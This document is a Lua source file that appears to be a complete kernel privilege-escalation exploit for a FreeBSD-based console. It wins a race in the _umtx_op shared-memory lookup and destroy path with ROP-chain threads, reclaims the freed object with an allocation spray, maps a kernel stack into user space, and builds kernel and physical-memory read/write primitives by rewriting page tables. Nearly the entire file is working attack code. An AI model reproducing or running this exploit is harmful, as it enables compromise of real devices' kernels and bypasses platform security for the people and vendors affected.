--if kr64 then error("kernel already pwned") end

-- Constants
syscalls = {
    fstat = 189,
    mmap = 477,
    rtprio = 166,
    yield = 321,
    sched_yield = 331,
    thr_exit = 431,
    _umtx_op = 454,
    thr_new = 455,
    ftruncate = 480,
    rtprio_thread = 466,
    sched_getscheduler = 330,
    sched_setscheduler = 329,
    cpuset_getaffinity = 487,
    cpuset_setaffinity = 488,
    shm_open = 482,
    ioctl = 54,
    setuid = 23,
    mprotect = 74,
    munmap = 73,
    kqueue = 362,
    kevent = 363,
    dup = 41,
    lseek = 478,
    dynlib_dlopen = 589,
    dynlib_dlclose = 590,
    dynlib_dlsym = 591,
    dynlib_get_list = 592,
    dynlib_get_info = 593,
    dynlib_load_prx = 594,
    dynlib_unload_prx = 595,
    dynlib_do_copy_relocations = 596,
    dynlib_prepare_dlclose = 597,
    dynlib_get_proc_param = 598,
    dynlib_process_needed_and_relocate = 599,
    dynlib_get_info_ex = 608,
    dynlib_get_obj_member = 649,
    dynlib_get_info_for_libdbg = 656,
    dynlib_get_list2 = 659,
    dynlib_get_info2 = 660,
    dynlib_get_list_for_libdbg = 672,
    setsid = 147,
    sendfile = 393,
    socketpair = 135,
    readv = 120,
    pread = 475,
    setsockopt = 105,
    nanosleep = 240,
    recv = 102,
    recvfrom = 29,
    sendto = 133
}

gadgets.popRax = mods.libc + 0x22b5c
gadgets.popRspRet = mods.libc + 0x334ed
gadgets.infloop = mods.libc + 0x30036

-- void _Lock_spin_lock(u8* Flag, int Order);
--  while (test_and_set(Flag)) {/*spin*/}
sym._Lock_spin_lock = mods.libc + 0xB470
-- void _Atomic_copy(u8 *Flag, u64 Size, void *Tgt, void *Src, int Order);
--  while (test_and_set(Flag)) {/*spin*/}
--  memcpy(Tgt, Src, Size) // no-op if Size=0
--  *Flag = 0
sym._Atomic_copy = mods.libc + 0xb520
-- void _Atomic_exchange(u8 *Flag, u64 Size, void *Tgt, void *Src, int Order);
-- like _Atomic_copy but exchanges the buffers instead of memcpy.
-- avoids the assert on overwriting retaddr, but dirties source buffer
sym._Atomic_exchange = mods.libc + 0xB580

PAGE_SIZE = 0x4000

NEGATIVE_ONE = Uint64:new(0xffffffff, 0xffffffff)

function round_up_page(val)
    val = force_Uint64(val)
    return lsl(bitfield_extract(val + 0x3fff, 14, 64 - 14), 14)
end

function malloc_mmap(len)
    local len_aligned = round_up_page(len)
    local buf = call(sym.syscall, syscalls.mmap, 0, len_aligned, 3, 0x1000, NEGATIVE_ONE, 0)
    if buf == NEGATIVE_ONE then error('mmap '..errno()) end
    return buf
end

function free_mmap(buf, len)
    local len_aligned = round_up_page(len)
    call(sym.syscall, syscalls.munmap, buf, len_aligned)
end

function memset(dst, val, len)
    return call(sym.memset, dst, val, len)
end

function ftruncate(fd, size)
    return call(sym.syscall, syscalls.ftruncate, fd, size)
end

function sched_yield()
    return call(sym.syscall, syscalls.sched_yield)
end

UMTX_OP_SHM = 26
UMTX_SHM_CREAT = 1
UMTX_SHM_LOOKUP = 2
UMTX_SHM_DESTROY = 4

function umtx_shm(addr, flags)
    return call(sym.syscall, syscalls._umtx_op, 0, UMTX_OP_SHM, flags, addr, 0)
end

function ioctl(fd, cmd, data)
    return call(sym.syscall, syscalls.ioctl, fd, cmd, data)
end

CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1
CPU_WHICH_PID = 2

function cpuset_getaffinity(level, which, id, setsize, mask)
    return call(sym.syscall, syscalls.cpuset_getaffinity, level, which, id, setsize, mask)
end

function cpuset_setaffinity(level, which, id, setsize, mask)
    return call(sym.syscall, syscalls.cpuset_setaffinity, level, which, id, setsize, mask)
end

function cpuset_getaffinity_tid(tid)
    local mask = malloc(0x10)
    local rv = cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, tid, 0x10, mask)
    if rv:negative_s64() then
        free(mask)
        return nil
    end
    local affinity = r64(mask)
    free(mask)
    return affinity
end

function cpuset_setaffinity_tid(tid, affinity)
    local mask = ub8(affinity)..ub8(0)
    return cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, tid, #mask, mask)
end

function cpuset_getaffinity_self()
    return cpuset_getaffinity_tid(NEGATIVE_ONE)
end

function cpuset_setaffinity_self(affinity)
    return cpuset_setaffinity_tid(NEGATIVE_ONE, affinity)
end

PRI_REALTIME = 2
PRI_FIFO = 10

function rtprio_thread(func, lwpid, rtp)
    return call(sym.syscall, syscalls.rtprio_thread, func, lwpid, rtp)
end

function rtprio_thread_get(lwpid)
    local rtp = malloc(4)
    local rv = rtprio_thread(0, lwpid, rtp)
    if rv:negative_s64() then
        free(rtp)
        return nil
    end
    rtprio = { type = r16(rtp), prio = r16(rtp + 2) }
    free(rtp)
    return rtprio
end

function rtprio_thread_set(lwpid, type, prio)
    local rtp = ub2(type)..ub2(prio)
    return rtprio_thread(1, lwpid, rtp)
end

function rtprio_thread_get_self()
    return rtprio_thread_get(0)
end

function rtprio_thread_set_self(type, prio)
    return rtprio_thread_set(0, type, prio)
end

-- Math stuff
oct2bin = {
    ['0'] = '000',
    ['1'] = '001',
    ['2'] = '010',
    ['3'] = '011',
    ['4'] = '100',
    ['5'] = '101',
    ['6'] = '110',
    ['7'] = '111'
}
function u32_to_bin(n)
    function helper(a)
        return oct2bin[a]
    end
    local s = string.format('%o', n)
    s = s:gsub('.', helper)
    s = string.rep("0", 32-#s) .. s
    return string.sub(s, #s-31, #s)
end
function u64_to_bin(n)
    return u32_to_bin(n.hi) .. u32_to_bin(n.lo)
end
function bin_to_u32(bs)
    return tonumber(bs, 2)
end
function bin_to_u64(bs)
    bs = string.rep("0", 64-#bs) .. bs
    local hi = tonumber(string.sub(bs, 1, 32), 2)
    local lo = tonumber(string.sub(bs, 33, 64), 2)
    return Uint64:new(lo, hi)
end
function bitfield_extract(n, start, length)
    local bs = u64_to_bin(n)
    local s = bs:sub(#bs - start - length + 1, #bs - start)
    if s == "" then
        s = "0"
    end
    return bin_to_u64(s)
end
function lsl(n, num)
    local tmp = u64_to_bin(n) .. string.rep("0", num)
    return bin_to_u64(string.sub(tmp, #tmp-63, #tmp))
end

-- RopThread
RopThread = {}
RopThread.__index = RopThread
RopThread.STACK_SIZE = 0x5000
RopThread.TLS_SIZE = 0x1000

function RopThread:new()
    local buf_len = self.STACK_SIZE + self.TLS_SIZE
    -- for some reason i can't get free(memalign()) to not crash, so use mmap here
    local buffer = malloc_mmap(buf_len)
    local obj = {
        buf = buffer,
        buf_len = buf_len,
        stack = buffer,
        tls = buffer + self.STACK_SIZE,
    }
    setmetatable(obj, self)
    return obj
end

function RopThread:cleanup()
    free_mmap(self.buf, self.buf_len)
    self.stack = nil
    self.tls = nil
end

function RopThread:start()
    local usable_size = self.STACK_SIZE - 0x1000
    local initial_rsp = self.stack + usable_size
    local tid_addr = self.stack + self.STACK_SIZE - 0x800
    -- thread starts with rip = start_func, rsp = stack_base + stack_size - 8
    local thr_param = '' ..
        ub8(gadgets.popRax) ..  -- start_func
        ub8(0) ..               -- arg
        ub8(self.stack) ..      -- stack_base
        ub8(usable_size) ..     -- stack_size
        ub8(self.tls) ..        -- tls_base
        ub8(self.TLS_SIZE) ..   -- tls_size
        ub8(tid_addr) ..        -- child_tid
        ub8(tid_addr) ..        -- parent_tid
        ub8(0) ..               -- flags
        ub8(0)                  -- rtprio

    -- TODO doesn't really seem needed
    local pivot = ''..
        ub8(gadgets.popRspRet)..
            ub8(self.chain_rsp)
    memcpy(initial_rsp, pivot, #pivot)

    local rv = call(sym.syscall, syscalls.thr_new, thr_param, #thr_param)
    if rv:negative_s64() then log_err('RopThread:start') end
    self.tid = r64(tid_addr).lo
    return rv
end

function RopThread:set_affinity(affinity)
    local rv = cpuset_setaffinity_tid(self.tid, affinity)
    if rv:negative_s64() then log_err('cpuset_setaffinity') end
    return rv
end

function RopThread:get_affinity()
    return cpuset_getaffinity_tid(self.tid)
end

-- DestroyThread
DestroyThread = { __index = RopThread }

function DestroyThread:new(shm_key, signal_addr)
    local obj = RopThread:new()
    setmetatable(obj, self)

    local chain = ''..
        -- Wait for signal_addr to be set to 0
        -- _Lock_spin_lock(Flag=signal_addr, Order=6)
        ub8(gadgets.popRdi) ..
            ub8(signal_addr) ..
        ub8(gadgets.popRsi) ..
            ub8(6) ..
        ub8(sym._Lock_spin_lock) ..
        -- _umtx_op(NULL, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key, NULL)
        -- XXX r8 uncontrolled here (last arg; should be NULL)
        ub8(gadgets.popRdi) ..
            ub8(0) ..
        ub8(gadgets.popRsi) ..
            ub8(UMTX_OP_SHM) ..
        ub8(gadgets.popRdx) ..
            ub8(UMTX_SHM_DESTROY) ..
        ub8(gadgets.popRcx) ..
            ub8(shm_key) ..
        ub8(gadgets.popRax) ..
            ub8(syscalls._umtx_op) ..
        ub8(sym.syscall) ..
        -- thr_exit(NULL)
        ub8(gadgets.popRdi) ..
            ub8(0) ..
        ub8(gadgets.popRax) ..
            ub8(syscalls.thr_exit) ..
        ub8(sym.syscall)

    obj.chain_rsp = obj.stack + 0x2000
    memcpy(obj.chain_rsp, chain, #chain)

    return obj
end

-- LookupThread
LookupThread = { __index = RopThread }

function LookupThread:new(shm_key, lookup_fd_addr, lookup_signal, destroy_signals)
    local obj = RopThread:new()
    setmetatable(obj, self)

    local chain = ''..
        -- Wait for lookup_signal to be set to 0
        -- _Lock_spin_lock(Flag=lookup_signal, Order=6)
        ub8(gadgets.popRdi) ..
            ub8(lookup_signal) ..
        ub8(gadgets.popRsi) ..
            ub8(6) ..
        ub8(sym._Lock_spin_lock)

    -- Signal destroy threads
    chain = chain..
        ub8(gadgets.popRax) ..
            ub8(0)
    for k, signal_addr in ipairs(destroy_signals) do
        chain = chain..
            ub8(gadgets.popRdi) ..
                ub8(signal_addr) ..
            ub8(gadgets.writeRaxToRdi)
    end

    chain = chain..
        -- fd = _umtx_op(NULL, UMTX_OP_SHM, UMTX_SHM_LOOKUP, shm_key, NULL)
        -- XXX r8 uncontrolled here (last arg; should be NULL)
        ub8(gadgets.popRdi) ..
            ub8(0) ..
        ub8(gadgets.popRsi) ..
            ub8(UMTX_OP_SHM) ..
        ub8(gadgets.popRdx) ..
            ub8(UMTX_SHM_LOOKUP) ..
        ub8(gadgets.popRcx) ..
            ub8(shm_key) ..
        ub8(gadgets.popRax) ..
            ub8(syscalls._umtx_op) ..
        ub8(sym.syscall) ..
        -- Store fd to memory
        -- *lookup_fd_addr = fd
        ub8(gadgets.popRdi) ..
            ub8(lookup_fd_addr) ..
        ub8(gadgets.writeRaxToRdi)..
        -- thr_exit(NULL)
        ub8(gadgets.popRdi) ..
            ub8(0) ..
        ub8(gadgets.popRax) ..
            ub8(syscalls.thr_exit) ..
        ub8(sym.syscall)

    obj.chain_rsp = obj.stack + 0x2000
    memcpy(obj.chain_rsp, chain, #chain)

    return obj
end

-- InfLoopThread
InfLoopThread = { __index = RopThread }

function InfLoopThread:new()
    -- Setup socketpair, for later
    local buffer_addr = malloc(0x2000)
    local recv_buffer = malloc(0x2000)

    -- Socketpair one
    local read_sock_array = malloc(8)
    local rc = call(sym.syscall, syscalls.socketpair, 1, 1, 0, read_sock_array)
    if rc:negative_s64() then error('socketpair read '..errno()) end

    local read_sock0 = r32(read_sock_array)
    local read_sock1 = r32(read_sock_array+4)
    log("socketpair read "..tostring(read_sock0)..' '..tostring(read_sock1))

    -- set SO_SNDBUF
    local so_sndbuf_val = ub4(0x1000)
    local rc = setsockopt(read_sock0, 0xffff, 0x1001, so_sndbuf_val, 4)
    if rc:negative_s64() then log_err('setsockopt(read_sock0, SO_SNDBUF)') end

    -- Socketpair two
    local write_sock_array = malloc(8)
    local rc = call(sym.syscall, syscalls.socketpair, 1, 1, 0, write_sock_array)
    if rc:negative_s64() then error('socketpair write '..errno()) end

    local write_sock0 = r32(write_sock_array)
    local write_sock1 = r32(write_sock_array+4)
    log("socketpair write "..tostring(write_sock0)..' '..tostring(write_sock1))

    -- set SO_SNDBUF
    local so_sndbuf_val = ub4(8)
    local rc = setsockopt(write_sock0, 0xffff, 0x1001, so_sndbuf_val, 4)
    if rc:negative_s64() then log_err('setsockopt(write_sock0, SO_SNDBUF)') end

    free(read_sock_array)
    free(write_sock_array)

    function make_part2(next_chain_addr, next_template_addr)
        return
            ub8(gadgets.popRdi) ..
                ub8(read_sock0) ..               -- arg0=read_sock0
            ub8(gadgets.popRsi) ..
                ub8(buffer_addr) ..              -- arg1=buffer_addr
            ub8(gadgets.popRdx) ..
                ub8(0x2000) ..                   -- arg2=0x1001 size
            ub8(gadgets.popRax) ..
                ub8(4) ..                        -- write
            ub8(sym.syscall) ..
            ub8(gadgets.popRdi) ..
                ub8(write_sock0) ..              -- arg0=write_sock0
            ub8(gadgets.popRsi) ..
                ub8(buffer_addr) ..              -- arg1=buffer_addr
            ub8(gadgets.popRdx) ..
                ub8(8) ..                        -- arg2=8 size
            ub8(gadgets.popRax) ..
                ub8(3) ..                        -- read
            ub8(sym.syscall) ..
            -- Copy the other chain
            ub8(gadgets.popRdi) ..
                ub8(next_chain_addr) ..          -- arg0=next_chain_addr
            ub8(gadgets.popRsi) ..
                ub8(next_template_addr) ..       -- arg1=next_template_addr
            ub8(gadgets.popRdx) ..
                ub8(0x400) ..                    -- arg2=0x400
            ub8(sym.memcpy) ..                   -- memcpy()
            -- Pivot to other chain
            ub8(gadgets.popRspRet) ..
                ub8(next_chain_addr)             -- new_rsp
    end

    local obj = RopThread:new()
    setmetatable(obj, self)

    -- Partition the stack memory
    local template1_addr = obj.stack
    local template2_addr = obj.stack + 0x1000
    local chain1_addr = obj.stack + 0x2000
    local chain2_addr = obj.stack + 0x3000
    -- Generate chain #1 & #2
    local chain1 = make_part2(chain2_addr, template2_addr)
    local chain2 = make_part2(chain1_addr, template1_addr)
    -- Copy template and chain for #1 & #2
    memcpy(template1_addr, chain1, 0x400)
    memcpy(template2_addr, chain2, 0x400)
    memcpy(chain1_addr, chain1, 0x400)
    memcpy(chain2_addr, chain2, 0x400)
    -- Kick start with chain #1
    obj.chain_rsp = chain1_addr
    obj.buffer_addr = buffer_addr
    obj.recv_buffer = recv_buffer
    obj.read_sock1 = read_sock1
    obj.write_sock1 = write_sock1

    return obj
end

function InfLoopThread:cleanup()
    free(self.buffer_addr)
    free(self.recv_buffer)
    self.buffer_addr = nil
    self.recv_buffer = nil
    RopThread:cleanup()
end

-- InfLoopDummyThread
InfLoopDummyThread = { __index = RopThread }

function InfLoopDummyThread:new()
    local obj = RopThread:new()
    setmetatable(obj, self)

    local chain = ub8(gadgets.infloop)

    obj.chain_rsp = obj.stack + 0x2000
    memcpy(obj.chain_rsp, chain, #chain)

    return obj
end

function shm_open_anon()
    -- __sys_shm_open(SHM_ANON, O_RDWR | O_CREAT, 0666)
    return call(sym.syscall, syscalls.shm_open, 1, 0x202, 0x1b6)
end

function fstat_check(fd, original_fd)
    local sb = malloc(0x200)
    local rv = call(sym.syscall, syscalls.fstat, fd, sb).lo
    local st_size = r64(sb + 0x48).lo
    free(sb)
    local size_fd = st_size / PAGE_SIZE
    local suspicious = rv == 0 and size_fd ~= fd and size_fd ~= original_fd
    log(string.format('fstat %d:%d(%d)', fd, rv, size_fd))
    if suspicious then
        log('!!!! wooooo !!!!!')
        return size_fd
    end
    return nil
end

function set_shmfd_size(fd)
    local size = fd * PAGE_SIZE
    return ftruncate(fd, size)
end

function race()
    -- Setup memory for things to come
    local tmp = malloc(0x400)
    local shm_key = tmp
    local destroy_signals = { tmp + 0x10, tmp + 0x18 }
    local lookup_signal = tmp + 0x20
    local lookup_fd_addr = tmp + 0x28

    -- just vm space for the ghetto spray
    local spray = malloc(PAGE_SIZE * 2)

    -- note that our pid affinity mask is 0x7f (from cpuset_getaffinity(CPU_WHICH_PID))
    local affinities = {1, 2, 4, 8, 0x10, 0x20, 0x40}
    cpuset_setaffinity_self(affinities[1])

    for num_tries=1,20,1 do
        collectgarbage()
        -- TODO dont recreate the threads all the time (there's no leak, but it could be faster)
        local dthreads = {}
        for i=1,2,1 do
            memcpy(destroy_signals[i], ub8(1), 8)
            dthreads[i] = DestroyThread:new(shm_key, destroy_signals[i])
            dthreads[i]:start()
            dthreads[i]:set_affinity(affinities[1 + i])
        end

        memcpy(lookup_fd_addr, ub8(0xffffffff), 8)
        memcpy(lookup_signal, ub8(1), 8)
        local lthread = LookupThread:new(shm_key, lookup_fd_addr, lookup_signal, destroy_signals)
        lthread:start()
        lthread:set_affinity(affinities[1 + 1 + #dthreads])

        -- Create a umtx_shm_reg { ushm_refcnt = 1, ushm_obj = { shm_refs = 2 } }
        local original_fd = umtx_shm(shm_key, UMTX_SHM_CREAT).lo
        log('original_fd '..tostring(original_fd))
        set_shmfd_size(original_fd)
        -- decref ushm_obj->shm_refs
        close(original_fd)

        -- create a shitload of shmfd
        local NUM_PER_CORE = 8
        for i=1,7,1 do
            for j=1,NUM_PER_CORE,1 do
                local addr = spray + (i * 8 + j) * 8
                local fd = umtx_shm(addr, UMTX_SHM_CREAT).lo
                close(fd)
            end
            collectgarbage()
        end

        -- signal the destroy and lookup threads
        memcpy(lookup_signal, ub8(0), 8)
        local gc_counter = 0
        while r32(lookup_fd_addr).lo == 0xffffffff do
            --- TODO we can hang forever in here...why?
            gc_counter = gc_counter + 1
            if (gc_counter % 100) == 0 then
                gc_counter = 0
                collectgarbage()
            end
        end

        -- free a bunch of shmfd to each core's freelist. this is a ghettohack for now
        for i=1,7,1 do
            cpuset_setaffinity_self(affinities[i])
            for j=1,NUM_PER_CORE,1 do
                local addr = spray + (i * 8 + j) * 8
                umtx_shm(addr, UMTX_SHM_DESTROY)
            end
            collectgarbage()
        end

        -- Actually do the reclaim. Under expected conditions, this would only
        -- need to be done on the same cores the DestroyThreads ran on (and the
        -- first allocation would reclaim).
        --for i=1,2,1 do
        --    cpuset_setaffinity_self(affinities[1 + i])
        --    dthreads[i].fd = shm_open_anon().lo
        --end
        local rfds = {}
        for i=1,7,1 do
            cpuset_setaffinity_self(affinities[i])
            rfds[i] = {}
            for j=1,NUM_PER_CORE,1 do
                rfds[i][j] = shm_open_anon().lo
            end
            collectgarbage()
        end
        cpuset_setaffinity_self(affinities[1])

        -- Uniquely mark all objects which may have reclaimed the allocation.
        --for k, dthread in ipairs(dthreads) do
        --    log('dthread '..tostring(k)..' fd '..tostring(dthread.fd))
        --    set_shmfd_size(dthread.fd)
        --end
        for i=1,7,1 do
            for j=1,NUM_PER_CORE,1 do
                local fd = rfds[i][j]
                set_shmfd_size(fd)
            end
            collectgarbage()
        end

        -- Figure out if the race + reclaim worked.
        local lthread_fd = r64(lookup_fd_addr).lo
        local winner = fstat_check(lthread_fd, original_fd)

        -- Cleanup
        --for k, dthread in ipairs(dthreads) do
        --    if dthread.fd ~= winner then
        --        close(dthread.fd)
        --    end
        --end
        for i=1,7,1 do
            for j=1,NUM_PER_CORE,1 do
                local fd = rfds[i][j]
                if fd ~= winner then
                    close(fd)
                end
            end
            collectgarbage()
        end

        for k, dthread in ipairs(dthreads) do
            dthread:cleanup()
        end
        lthread:cleanup()

        if winner then
            free(spray)
            free(tmp)
            return {
                num_tries = num_tries,
                lookup = lthread_fd,
                winner = winner,
            }
        end

        -- NOTE: if the race succeeded but we failed to reclaim the allocation
        -- (via shm_open_anon on a DestroyThread/core), then closing this fd will
        -- cause a doublefree or free of some random kernel allocation - both
        -- will cause a panic eventually.
        -- Just leak.
        --close(lthread_fd)
    end

    free(spray)
    free(tmp)
    return nil
end

-- Exploit
function exploit()
    log("exploit")
    local rv = nil

    -- Fix thread priority on lua thread
    -- This prevents immediately switching to new threads when created via thr_new (since our new
    -- threads inherit prio), which would cause lock inversion in our case.
    rv = rtprio_thread_set_self(PRI_REALTIME, 700)
    if rv:negative_s64() then log_err('rtprio_thread') end

    local result = race()
    if not result then error('race failed') end

    log(string.format('race won after %d tries lookup:%d winner:%d', result.num_tries,
        result.lookup, result.winner))
    local spray_threads = {}
    for i=1,10,1 do
        spray_threads[i] = InfLoopThread:new()
        if (i % 4) == 0 then collectgarbage() end
    end
    collectgarbage()

    local spray = malloc(PAGE_SIZE)
    for i=1,4,1 do
        umtx_shm(spray + i * 8, UMTX_SHM_CREAT)
    end

    close(result.winner)

    local kstack_len = PAGE_SIZE
    kstack = call(sym.syscall, syscalls.mmap, 0, kstack_len, 0, 1, result.lookup, 0)

    for k, thread in ipairs(spray_threads) do
        thread:start()
    end

    -- wait for threads to start up. TODO replace with counter?
    --for i=1,8,1 do sched_yield() end

    --log('kstack '..tostring(kstack))
    rv = call(sym.syscall, syscalls.mprotect, kstack, kstack_len, 3)
    log("mprotect " .. tostring(rv) .. " " .. errno())
    log("stuff " .. tostring(r64(kstack)))

    for k, thread in ipairs(spray_threads) do
        -- try to not starve cpu time (defaults to core 0 only)
        thread:set_affinity(0x7f)
    end

    local thread_idx = nil
    local read_ptr_off = nil
    for i=0x3000,0x4000-8,8 do
        for k, thread in ipairs(spray_threads) do
            if r64(kstack + i) == thread.buffer_addr + 0x1000 then
                log(string.format('thread %d won', k))
                read_ptr_off = i
                thread_idx = k
                break
            end
        end
        if thread_idx then break end
    end
    log('read_ptr_off '..tostring(read_ptr_off))
    if not thread_idx then error('fail') end

    -- TODO kill off the losers

    buffer_addr = spray_threads[thread_idx].buffer_addr
    read_sock1 = spray_threads[thread_idx].read_sock1
    write_sock1 = spray_threads[thread_idx].write_sock1
    recv_buffer = spray_threads[thread_idx].recv_buffer

    -- TODO remember what these are lol
    local OFFSET0 = 0x3790 -- 0x37d0
    local OFFSET1 = 0x37a0 -- 0x37e0
    local OFFSET2 = 0x38b0 -- 0x38f0

    kthread = r64(kstack + OFFSET1 + 0x28)
    log("kthread " .. tostring(kthread))

    -- is_read == true  means it reads 4k from kaddr
    -- is_read == false means it writes 8 bytes of value to kaddr
    function k_op(is_read, kaddr, value)
        while r64(kstack + OFFSET0) ~= buffer_addr + 0x1000 do
            log("<waiting>")
            collectgarbage()
            log('kstack '..tostring(kstack))
            tcp_file_write('kstack_bad.bin', r(kstack, kstack_len))
            error('die')
        end

        if is_read then
            memcpy(kstack + OFFSET1 + 0x20, ub4(1), 4)
            memcpy(kstack + OFFSET0, ub8(kaddr), 8)
        end

        local rc = call(sym.syscall, syscalls.recvfrom, read_sock1, recv_buffer, 0x2000, MSG_WAITALL, 0, 0)

        while r64(kstack + OFFSET0) ~= buffer_addr do
            log("<waiting2>")
            collectgarbage()
        end

        if not is_read then
            memcpy(kstack + OFFSET1 + 0x20, ub4(1), 4)
            memcpy(kstack + OFFSET0, ub8(kaddr), 8)
            memcpy(kstack + OFFSET2, ub8(kaddr), 8)
        end

        value = value or 0
        local rc = call(sym.syscall, syscalls.sendto, write_sock1, ub8(value), 8, 0, 0, 0)

        collectgarbage()

        if is_read then
            return r(recv_buffer + 0x1000, 0x1000)
        end
    end

    function kr4k(kaddr)
        return k_op(true, kaddr)
    end
    function kr64(kaddr)
        return r64(addrof_string_payload(kr4k(kaddr - (kaddr.lo % 4096))) + (kaddr.lo % 4096))
    end
    function kw64(kaddr, value)
        return k_op(false, kaddr, value)
    end

    log("GOT KERNEL")
end

function get_phys_primitives()
    kproc = kr64(kthread + 8)
    kvmspace = kr64(kproc + 0x200)
    kpml4_kva = kr64(kvmspace + 0x300)
    kpml4_pa = kr64(kvmspace + 0x308)
    dmap = kpml4_kva - kpml4_pa
    kpml3_pa = bitfield_extract(kr64(kpml4_kva), 12, 34-12).lo * 0x1000

    for i = 0,4,1 do
        for j = 0,3,1 do
            kw64(dmap + kpml3_pa + (0x180*8 + 8*4*i + 8*j), Uint64:new(0x9f + (j*0x40000000), 0x80000000 + i))
        end
    end

    for i=1,16,1 do
        local rc = call(sym.syscall, syscalls.sched_yield)
    end

    function pr64(paddr)
        paddr = force_Uint64(paddr)
        return r64(Uint64:new(paddr.lo, paddr.hi + 0x60))
    end
    function pr32(paddr)
        paddr = force_Uint64(paddr)
        return r32(Uint64:new(paddr.lo, paddr.hi + 0x60))
    end
    function pw64(paddr, value)
        paddr = force_Uint64(paddr)
        memcpy(Uint64:new(paddr.lo, paddr.hi + 0x60), ub8(value), 8)
    end
    function pw32(paddr, value)
        paddr = force_Uint64(paddr)
        memcpy(Uint64:new(paddr.lo, paddr.hi + 0x60), ub8(value), 4)
    end
    function pw(paddr, value)
        paddr = force_Uint64(paddr)
        memcpy(Uint64:new(paddr.lo, paddr.hi + 0x60), value, #value)
    end
    function pr(paddr, len)
        paddr = force_Uint64(paddr)
        return r(Uint64:new(paddr.lo, paddr.hi + 0x60), len)
    end


    log("GOT PHYS PRIMITIVES")
end

function get_pte_ptr(addr, cr3)
    local pml4i = bitfield_extract(addr, 39, 9).lo
    local pml3i = bitfield_extract(addr, 30, 9).lo
    local pml2i = bitfield_extract(addr, 21, 9).lo
    local pml1i = bitfield_extract(addr, 12, 9).lo

    local pml4_pa = cr3 or kpml4_pa
    local pml4e = pr64(pml4_pa + 8*pml4i)

    local pml3_pa = lsl(bitfield_extract(pml4e, 12, 39), 12) + 8*pml3i
    local pml3e = pr64(pml3_pa)
    local large = bitfield_extract(pml3e, 7, 1)
    if large.lo ~= 0 then return pml3_pa, pml3e, 0x40000000, 12+9+9 end

    local pml2_pa = lsl(bitfield_extract(pml3e, 12, 39), 12) + 8*pml2i
    local pml2e = pr64(pml2_pa)
    local large = bitfield_extract(pml2e, 7, 1)
    if large.lo ~= 0 then return pml2_pa, pml2e, 0x200000, 12+9 end

    local pml1_pa = lsl(bitfield_extract(pml2e, 12, 39), 12) + 8*pml1i
    local pml1e = pr64(pml1_pa)
    return pml1_pa, pml1e, 0x1000, 12
end

function get_pa(addr, cr3)
    local pte_pa, pte, align, shift = get_pte_ptr(addr, cr3)
    return lsl(bitfield_extract(pte, 12, 39), 12) + (addr.lo % align)
end

function fixup()
    log('fixing up...')
    local vm_map = kvmspace
    while true do
        collectgarbage()
        local start = pr64(get_pa(vm_map + 0x20))
        if start == kstack then
            local object = pr64(get_pa(vm_map + 0x50))
            pw32(get_pa(object + 0x84), pr32(get_pa(object + 0x84)) + 1)
            log('fixed!')
            break
        end
        vm_map = pr64(get_pa(vm_map + 8))
        if vm_map == kvmspace then
            error('failed to fixup')
            break
        end
    end
end

exploit()
get_phys_primitives()
fixup()
